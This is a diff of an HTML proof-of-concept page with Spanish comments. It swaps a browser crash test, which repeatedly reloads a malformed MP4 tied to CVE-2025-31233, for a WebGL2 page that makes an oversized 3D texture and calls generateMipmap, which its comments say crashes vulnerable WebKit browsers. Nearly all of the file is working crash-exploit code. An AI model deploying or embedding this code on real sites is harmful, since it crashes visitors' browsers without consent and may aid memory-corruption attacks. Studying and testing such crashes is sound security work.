@@ -1,61 +1,57 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>MP4 Exploit Test - CVE-2025-31233</title>
-  <style>
-    body {
-      background: #000;
-      color: #0f0;
-      font-family: monospace;
-      padding: 1em;
-    }
-    #log {
-      white-space: pre-wrap;
-    }
-    video {
-      display: none; /* oculto para evitar render visual */
-    }
-  </style>
+  <title>WebGL3D Mipmap Crash Test</title>
+  <style>body { background: #000; color: lime; font-family: monospace; }</style>
 </head>
 <body>
-  <h2>🎬 CVE-2025-31233 - MP4 Malformed Exploit Test</h2>
-  <div id="log">[+] Cargando video malformado...</div>
-
-  <video id="evilVideo" loop autoplay muted></video>
-
+  <h1>WebGL3D Mipmap Crash PoC</h1>
+  <p>Si tu navegador es vulnerable, puede colapsar ahora.</p>
   <script>
-    const log = msg => {
-      document.getElementById("log").textContent += "\n" + msg;
-      console.log(msg);
-    };
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl2");
 
-    const video = document.getElementById("evilVideo");
-    video.src = "corrupted_payload.mp4";
-
-    video.oncanplay = () => {
-      log("[+] Video cargado y listo para reproducir.");
-    };
-
-    video.onerror = () => {
-      log("[!] Error al reproducir video. Podría ser signo de corrupción o mitigación activa.");
-    };
-
-    video.onended = () => {
-      log("[!] Video terminó inesperadamente. ¿Crash parcial?");
-    };
-
-    let attempts = 0;
-    function spamReload() {
-      video.load();
-      attempts++;
-      if (attempts < 500) {
-        setTimeout(spamReload, 100);
-      } else {
-        log("[+] Finalizó ciclo de reproducción forzada.");
+      if (!gl) {
+        document.body.innerHTML += "<p style='color:red'>WebGL2 no disponible</p>";
+        throw "WebGL2 no soportado.";
       }
-    }
 
-    setTimeout(spamReload, 1500);
+      const tex = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_3D, tex);
+
+      const width = 4;
+      const height = 4;
+      const depth = 64; // <<<< Aquí está el crash: depth >> width/height
+
+      const levels = Math.floor(Math.log2(Math.max(width, height, depth))) + 1;
+      const data = new Uint8Array(width * height * depth);
+
+      gl.texImage3D(
+        gl.TEXTURE_3D,
+        0, // mip level
+        gl.R8,
+        width,
+        height,
+        depth,
+        0,
+        gl.RED,
+        gl.UNSIGNED_BYTE,
+        data
+      );
+
+      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_LINEAR);
+      gl.texParameteri(gl.TEXTURE_3D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);
+
+      // 💣 Aquí se forza el crash si WebKit es vulnerable
+      gl.generateMipmap(gl.TEXTURE_3D);
+
+      document.body.innerHTML += "<p style='color:lime'>Mipmap generado sin crash</p>";
+
+    } catch (e) {
+      console.error(e);
+      document.body.innerHTML += `<p style='color:red'>Error: ${e}</p>`;
+    }
   </script>
 </body>
 </html>
